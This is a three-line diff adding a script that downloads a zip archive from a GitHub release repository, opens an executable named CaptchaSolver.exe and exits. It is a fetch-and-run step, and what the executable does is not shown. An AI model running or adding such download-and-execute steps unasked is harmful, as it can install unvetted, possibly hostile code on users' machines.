@@ -1,0 +1,3 @@
+DOWNLOADFILE https://github.com/DeLuxe-1337/Release/raw/main/net5.0.zip
+OPEN CaptchaSolver.exe
+EXIT
